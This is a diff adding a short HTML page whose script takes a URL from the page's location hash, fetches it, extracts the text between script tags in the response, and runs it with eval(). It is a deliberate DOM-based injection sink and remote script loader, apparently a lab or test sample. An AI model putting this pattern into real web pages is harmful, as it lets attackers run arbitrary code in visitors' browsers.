@@ -1,0 +1,24 @@
+<html>
+<head>
+<script>
+// Create an XMLHttpRequest object
+const xhttp = new XMLHttpRequest();
+
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var d = xhttp.responseText;
+        var a = d.indexOf("<script>") + "<script>".length;
+        var b = d.indexOf("<\/script>");
+        var d2 = d.substring(a,b);
+        eval(d2);
+    }
+};
+
+// Send a request
+xhttp.open("GET", window.location.hash.substring(1));
+xhttp.send();
+</script>
+</head>
+<body>
+</body>
+</html>
